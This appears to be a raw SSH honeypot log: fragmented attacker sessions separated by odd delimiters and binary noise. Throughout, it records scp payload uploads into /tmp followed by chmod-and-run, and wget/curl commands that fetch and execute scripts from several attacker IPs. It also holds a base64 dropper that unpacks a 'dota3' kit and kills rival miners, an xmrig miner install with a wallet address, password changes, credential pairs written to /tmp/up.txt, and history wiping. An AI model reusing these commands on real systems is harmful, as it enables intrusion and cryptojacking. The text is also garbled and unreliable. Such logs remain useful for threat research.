scp -|::|- -t -|::|- /tmp/wpAswCt9
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 29e15QrH -|::|- && -|::|- bash -|::|- -c -|::|- ./29e15QrH -|::|- -bash: -|::|- ./29e15QrH: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- gmaj -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- 0`Q!
scp -|::|- -t -|::|- /tmp/Pe48ZWCL
[email] -|::|- linux -|::|- node:~$ -|::|- AS1741 -|::|- CSC -|::|- - -|::|- Tieteen -|::|- tietotekniikan -|::|- keskus -|::|- Oy -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- ip: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- lscpu: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- Try -|::|- `shutdown -|::|- --help' -|::|- for -|::|- more -|::|- information. -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$
.`s( -|::|- echo -|::|- "root -|::|- pass0 -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- .`+p
scp -|::|- -t -|::|- /tmp/fUZbZWCy
#!/bin/sh -|::|- PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin -|::|- wget -|::|- http://182.53.197.62/centaur-docs/23 -|::|- curl -|::|- -O -|::|- http://182.53.197.62/centaur-docs/23 -|::|- chmod -|::|- +x -|::|- 23 -|::|- ./23 -|::|- wget -|::|- http://182.53.197.62/centaur-docs/23s -|::|- curl -|::|- -O -|::|- http://182.53.197.62/centaur-docs/23s -|::|- chmod -|::|- +x -|::|- 23s -|::|- ./23s
echo -|::|- "user -|::|- Huawei12#$" -|::|- > -|::|- /tmp/up.txt
sleep -|::|- 15s -|::|- && -|::|- cd -|::|- /var/tmp; -|::|- echo -|::|- #!/bin/bash
cd /tmp	
rm -rf .ssh
rm -rf .mountfs
rm -rf .X13-unix
rm -rf .X17-unix
rm -rf .X19-unix
mkdir .X19-unix
cd .X19-unix
mv /var/tmp/dota3.tar.gz dota3.tar.gz
tar xf dota3.tar.gz
sleep 3s && cd .rsync; cat /tmp/.X19-unix/.rsync/initall | bash 2>1&
sleep 45s && pkill -9 run && pkill -9 go && pkill -9 tsm
exit 0 -|::|- | -|::|- base64 -|::|- --decode -|::|- | -|::|- bash -|::|- ҉`gK
ls -|::|- -lh -|::|- $(which -|::|- ls) -|::|- ls: -|::|- cannot -|::|- access -|::|- /usr/local/bin/ls -|::|- /usr/bin/ls -|::|- /bin/ls -|::|- /usr/local/games/ls -|::|- /usr/games/ls: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
Tފ`u -|::|- Tފ`< -|::|- scp -|::|- -t -|::|- /tmp/r52q3e0X -|::|- Tފ`5 -|::|- Tފ`l -|::|- Uފ`2a
2c`Rp -|::|- 2c`p -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- nLXjxExB -|::|- && -|::|- bash -|::|- -c -|::|- ./nLXjxExB -|::|- 2c`z -|::|- -bash: -|::|- ./nLXjxExB: -|::|- command -|::|- not -|::|- found -|::|- 2c`X~
0O`s -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- e8eLilnd -|::|- && -|::|- bash -|::|- -c -|::|- ./e8eLilnd -|::|- -bash: -|::|- ./e8eLilnd: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- xvGMtotm -|::|- && -|::|- bash -|::|- -c -|::|- ./xvGMtotm -|::|- -bash: -|::|- ./xvGMtotm: -|::|- command -|::|- not -|::|- found
j)`i -|::|- echo -|::|- "root -|::|- qazqaz -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- j)`RU
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 2wwZXGjq -|::|- && -|::|- bash -|::|- -c -|::|- ./2wwZXGjq -|::|- -bash: -|::|- ./2wwZXGjq: -|::|- command -|::|- not -|::|- found
VU`o -|::|- cat -|::|- /etc/issue -|::|- VU`L -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l -|::|- VU`m
"׉`K^ -|::|- "׉`^ -|::|- echo -|::|- "root -|::|- Apple@123" -|::|- > -|::|- /tmp/up.txt
҉`^m -|::|- echo -|::|- "root -|::|- zhang123" -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/8Iv1YM0T
[email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- [email] -|::|- linux -|::|- node:~$
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- bzkxaVoK -|::|- && -|::|- bash -|::|- -c -|::|- ./bzkxaVoK -|::|- -bash: -|::|- ./bzkxaVoK: -|::|- command -|::|- not -|::|- found
2`XL -|::|- echo -|::|- "admin -|::|- P@ssword1" -|::|- > -|::|- /tmp/up.txt
echo -|::|- "root -|::|- ABCabc123456" -|::|- > -|::|- /tmp/up.txt
՜``x -|::|- scp -|::|- -t -|::|- /tmp/tzE6ezMO -|::|- ՜`}r
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Tgvp8gNP -|::|- && -|::|- bash -|::|- -c -|::|- ./Tgvp8gNP -|::|- -bash: -|::|- ./Tgvp8gNP: -|::|- command -|::|- not -|::|- found
echo -|::|- -e -|::|- "linix37*)@#BT"\nt5jqEYpv3To3\nt5jqEYpv3To3"|passwd|bash -|::|- TӞ`W -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file -|::|- UӞ`;
?H`] -|::|- ?H`# -|::|- nproc -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found
apt -|::|- update -|::|- -y; -|::|- apt -|::|- install -|::|- curl -|::|- -y; -|::|- cat -|::|- /etc/issue; -|::|- curl -|::|- -s -|::|- -L -|::|- https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh -|::|- | -|::|- bash -|::|- -s -|::|- 49bGaMpdZtB5MqnyAwMk5u9bv3zjpyTE2RnQz2djYCm1goxkSkPuodnW8ayyjNLfLAA72Qm29uJT4RbxCAzbkVH6PxPAZZa;timeout -|::|- 10 -|::|- top -|::|- -bash: -|::|- apt: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- apt: -|::|- command -|::|- not -|::|- found -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l -|::|- -bash: -|::|- timeout: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- curl:: -|::|- command -|::|- not -|::|- found
curl -|::|- http://71.127.148.69/.x/3sh -|::|- | -|::|- sh
echo -|::|- "root -|::|- hg -|::|- " -|::|- > -|::|- /tmp/up.txt
echo -|::|- -e -|::|- "qwer`123\n20cBaYmtZ6ev\n20cBaYmtZ6ev"|passwd|bash -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
cat -|::|- /etc/issue; -|::|- cd -|::|- /tmp -|::|- || -|::|- cd -|::|- /var/run -|::|- || -|::|- cd -|::|- /mnt -|::|- || -|::|- cd -|::|- /root -|::|- || -|::|- cd -|::|- /; -|::|- wget -|::|- -q -|::|- http://179.43.176.41/cometome; -|::|- cat -|::|- cometome -|::|- > -|::|- meth; -|::|- chmod -|::|- +x -|::|- meth; -|::|- chmod -|::|- 777 -|::|- *; -|::|- ./meth -|::|- rooted; -|::|- history -|::|- -c -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l -|::|- -bash: -|::|- ./meth: -|::|- command -|::|- not -|::|- found
crontab -|::|- -l -|::|- no -|::|- crontab -|::|- for -|::|- admin
echo -|::|- "root -|::|- tatertot" -|::|- > -|::|- /tmp/up.txt -|::|- t`_d
`9| -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- "`c_ -|::|- 22:05:22 -|::|- up -|::|- 12 -|::|- days, -|::|- 2:17, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- root -|::|- pts/0 -|::|- 79.112.61.138 -|::|- 22:05 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- #`R{ -|::|- $`eI -|::|- $`{5 -|::|- total -|::|- used -|::|- free -|::|- shared -|::|- buff/cache -|::|- available -|::|- Mem: -|::|- 16010468 -|::|- 956584 -|::|- 6554448 -|::|- 1020 -|::|- 8499436 -|::|- 15342320 -|::|- Swap: -|::|- 0 -|::|- 0 -|::|- 0 -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- &`L[ -|::|- &`.@ -|::|- -bash: -|::|- lspci: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- (`FV -|::|- (`sK -|::|- (`FL -|::|- )`#2 -|::|- )`|% -|::|- )`&, -|::|- *`-[ -|::|- +`[I -|::|- +`S6 -|::|- +`l+ -|::|- +`.O
4B`9 -|::|- scp -|::|- -t -|::|- /tmp/Tgvp8gNP -|::|- 4B`P -|::|- 4B`R -|::|- 4B`; -|::|- 4B`r
/bin/eyshcjdmzg -|::|- x`\t -|::|- -bash: -|::|- /bin/eyshcjdmzg: -|::|- command -|::|- not -|::|- found
echo -|::|- -e -|::|- "qwer`123\nLcBrw0CObnR0\nLcBrw0CObnR0"|passwd|bash -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
echo -|::|- "ftpuser -|::|- 123" -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/Ul9w3KBu
cat -|::|- /var/tmp/.systemcache436621
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 4VwfB463 -|::|- && -|::|- bash -|::|- -c -|::|- ./4VwfB463 -|::|- -bash: -|::|- ./4VwfB463: -|::|- command -|::|- not -|::|- found
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- model -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- wc -|::|- -l
echo -|::|- "admin -|::|- 1234qwer" -|::|- > -|::|- /tmp/up.txt
rm -|::|- -rf -|::|- /tmp/2sh; -|::|- wget -|::|- -c -|::|- http://71.127.148.69/.x/2sh -|::|- -P -|::|- /tmp -|::|- && -|::|- sh -|::|- /tmp/2sh -|::|- & -|::|- --2021-04-29 -|::|- 00:24:28-- -|::|- http://71.127.148.69/.x/2sh -|::|- Connecting -|::|- to -|::|- 71.127.148.69:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 1965 -|::|- (1K) -|::|- [text/plain] -|::|- Saving -|::|- to: -|::|- `/home/root/2sh' -|::|- 100% -|::|- [=======================================>] -|::|- 1,965 -|::|- 6K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 1,965 -|::|- 6K/s -|::|- 2021-04-29 -|::|- 00:24:28 -|::|- (6 -|::|- KB/s) -|::|- - -|::|- `/home/root/2sh' -|::|- saved -|::|- [1965/1965]
#!/bin/sh -|::|- PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin -|::|- wget -|::|- http://182.53.197.73/scripts/23s -|::|- curl -|::|- -O -|::|- http://182.53.197.73/scripts/23s -|::|- chmod -|::|- +x -|::|- 23s -|::|- ./23s -|::|- wget -|::|- http://182.53.197.73/scripts/23 -|::|- curl -|::|- -O -|::|- http://182.53.197.73/scripts/23 -|::|- chmod -|::|- +x -|::|- 23 -|::|- ./23 -|::|- rm -|::|- -rf -|::|- 23.sh
echo -|::|- "qwer`123\nLcBrw0CObnR0\nLcBrw0CObnR0\n"|passwd -|::|- =`o\ -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
݉`b5 -|::|- echo -|::|- "root -|::|- 123457" -|::|- > -|::|- /tmp/up.txt
lscpu -|::|- | -|::|- grep -|::|- Model -|::|- -bash: -|::|- lscpu: -|::|- command -|::|- not -|::|- found
/bin/skhqwensw -|::|- -bash: -|::|- /bin/skhqwensw: -|::|- command -|::|- not -|::|- found
scp -|::|- -t -|::|- /tmp/q80t6JBH -|::|- s!`" -|::|- s!`T -|::|- s!`D -|::|- s!`q -|::|- t!`m
scp -|::|- -t -|::|- /tmp/iXBLMgmb
cat -|::|- /var/tmp/.var03522123 -|::|- | -|::|- head -|::|- -n -|::|- 1 -|::|- щ`6O
ps -|::|- -ef -|::|- | -|::|- grep -|::|- '[Mm]iner'
)`F* -|::|- echo -|::|- Hi -|::|- | -|::|- cat -|::|- -n -|::|- 1 -|::|- )`i1
scp -|::|- -t -|::|- /tmp/2Sb5fAJ0
Η`\u -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- wpAswCt9 -|::|- && -|::|- bash -|::|- -c -|::|- ./wpAswCt9 -|::|- -bash: -|::|- ./wpAswCt9: -|::|- command -|::|- not -|::|- found
pkill -|::|- YDEdr; -|::|- pkill -|::|- ip; -|::|- pkill -|::|- xmrig; -|::|- pkill -|::|- cnrig; -|::|- pkill -|::|- kswapd0; -|::|- pkill -|::|- x86_64; -|::|- pkill -|::|- x86; -|::|- cd -|::|- /tmp; -|::|- rm -|::|- -rf -|::|- config.json; -|::|- rm -|::|- -rf -|::|- kitten; -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- curl -|::|- -O -|::|- http://88.218.17.142/boom.sh; -|::|- busybox -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- chmod -|::|- 777 -|::|- *; -|::|- sh -|::|- boom.sh; -|::|- cat -|::|- /etc/issue; -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- --2021-04-29 -|::|- 19:56:09-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 5K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 5K/s -|::|- 2021-04-29 -|::|- 19:56:09 -|::|- (5 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed -|::|- 100 -|::|- 379.0 -|::|- 100 -|::|- 379.0 -|::|- 0 -|::|- 0 -|::|- 63673 -|::|- 0 -|::|- --:--:-- -|::|- --:--:-- -|::|- --:--:-- -|::|- 65181 -|::|- --2021-04-29 -|::|- 19:56:09-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 5K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 5K/s -|::|- 2021-04-29 -|::|- 19:56:09 -|::|- (5 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- FsfufM4B -|::|- && -|::|- bash -|::|- -c -|::|- ./FsfufM4B -|::|- -bash: -|::|- ./FsfufM4B: -|::|- command -|::|- not -|::|- found
i`kT -|::|- echo -|::|- "postgres -|::|- passw0rd" -|::|- > -|::|- /tmp/up.txt
j`aY -|::|- echo -|::|- "root -|::|- Aa123321" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- IhjJXTMA -|::|- && -|::|- bash -|::|- -c -|::|- ./IhjJXTMA -|::|- -bash: -|::|- ./IhjJXTMA: -|::|- command -|::|- not -|::|- found
